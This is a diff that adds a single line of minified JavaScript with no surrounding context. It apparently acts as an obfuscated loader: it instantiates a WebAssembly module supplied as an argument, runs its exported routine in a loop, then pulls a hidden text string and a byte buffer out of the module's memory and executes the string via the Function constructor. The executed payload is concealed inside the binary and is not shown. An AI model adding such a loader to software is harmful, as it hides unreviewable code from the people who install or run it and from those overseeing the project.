@@ -1,0 +1,1 @@
+(async function(r){let s=await WebAssembly.instantiate(r),a=()=>{let e=s.instance.exports.m.buffer,t=new DataView(e),n=7340040,i=t.getUint32(n,!0),o=t.getUint32(n+4,!0),l=new TextDecoder().decode(new Uint8Array(e,0,i)),m=new Uint8Array(e,i,o);Function(l)(m)};while(s.instance.exports.d());a()})(arguments[0]);
